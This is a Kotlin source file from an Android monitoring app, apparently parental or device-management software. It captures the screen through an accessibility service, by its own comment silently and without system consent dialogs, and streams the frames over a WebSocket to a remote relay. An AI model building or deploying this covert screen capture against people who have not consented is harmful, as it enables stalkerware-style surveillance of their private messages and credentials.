package com.spapp.monitoring.screenstream

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import androidx.annotation.RequiresApi
import com.spapp.monitoring.BuildConfig
import com.spapp.monitoring.blocking.BlockAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Manages live screen streaming from the Android device to the backend WebSocket relay.
 *
 * Uses AccessibilityService.takeScreenshot (Android 11+) to capture screen frames silently
 * without intrusive system dialogs, downscales and compresses them as JPEG, and streams
 * binary frames over WebSocket at ~2.5 FPS.
 */
object ScreenStreamManager {

    private const val TAG = "ScreenStreamManager"
    private const val FRAME_INTERVAL_MS = 400L // ~2.5 FPS (well within Android's 333ms rate limit)
    private const val TARGET_MAX_DIMENSION = 720
    private const val JPEG_QUALITY = 65

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var streamJob: Job? = null
    private var activeWebSocket: WebSocket? = null
    private val isStreaming = AtomicBoolean(false)
    private val frameInFlight = AtomicBoolean(false)

    private val wsBaseUrl: String by lazy {
        BuildConfig.API_BASE_URL
            .replaceFirst("http://", "ws://")
            .replaceFirst("https://", "wss://")
            .trimEnd('/')
    }

    @Synchronized
    fun startStreaming(context: Context, authToken: String, deviceId: String) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "Screen streaming requires Android 11+")
            return
        }

        // Stop any previous stream session
        stopStreaming()

        isStreaming.set(true)
        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(15, TimeUnit.SECONDS)
            .build()

        val url = "$wsBaseUrl/ws/screen-stream?role=device&token=$authToken&deviceId=$deviceId"
        val request = Request.Builder().url(url).build()

        activeWebSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Screen stream WebSocket connected")
                startCaptureLoop(context, webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    if (json.optString("action") == "stop") {
                        Log.d(TAG, "Received stop signal from relay/admin")
                        stopStreaming()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing WS message", e)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code / $reason")
                stopStreaming()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                stopStreaming()
            }
        })
    }

    @Synchronized
    fun stopStreaming() {
        if (!isStreaming.getAndSet(false)) return

        Log.d(TAG, "Stopping screen stream")
        streamJob?.cancel()
        streamJob = null

        try {
            activeWebSocket?.close(1000, "stream stopped")
        } catch (_: Exception) {}
        activeWebSocket = null
        frameInFlight.set(false)
    }

    private fun startCaptureLoop(context: Context, ws: WebSocket) {
        streamJob?.cancel()
        streamJob = scope.launch {
            Log.d(TAG, "Capture loop started")
            while (isActive && isStreaming.get()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    captureAndSendFrame(context, ws)
                }
                delay(FRAME_INTERVAL_MS)
            }
            Log.d(TAG, "Capture loop ended")
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun captureAndSendFrame(context: Context, ws: WebSocket) {
        val service = BlockAccessibilityService.instance ?: run {
            Log.w(TAG, "BlockAccessibilityService not active")
            return
        }

        if (frameInFlight.getAndSet(true)) {
            return
        }

        try {
            service.takeScreenshot(
                Display.DEFAULT_DISPLAY,
                context.mainExecutor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                        scope.launch(Dispatchers.Default) {
                            val hardwareBuffer = screenshotResult.hardwareBuffer
                            val colorSpace = screenshotResult.colorSpace
                            try {
                                val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                if (bitmap != null) {
                                    val scaled = downscaleBitmap(bitmap, TARGET_MAX_DIMENSION)
                                    val out = ByteArrayOutputStream()
                                    scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
                                    val bytes = out.toByteArray()

                                    if (scaled != bitmap) scaled.recycle()
                                    bitmap.recycle()

                                    if (isStreaming.get()) {
                                        ws.send(bytes.toByteString())
                                    }
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Error encoding frame", e)
                            } finally {
                                hardwareBuffer.close()
                                frameInFlight.set(false)
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.d(TAG, "takeScreenshot failure code: $errorCode")
                        frameInFlight.set(false)
                    }
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to invoke takeScreenshot", e)
            frameInFlight.set(false)
        }
    }

    private fun downscaleBitmap(src: Bitmap, maxDim: Int): Bitmap {
        val width = src.width
        val height = src.height
        if (width <= maxDim && height <= maxDim) return src
        val scale = maxDim.toFloat() / maxOf(width, height)
        val dstWidth = (width * scale).toInt().coerceAtLeast(1)
        val dstHeight = (height * scale).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(src, dstWidth, dstHeight, true)
    }
}
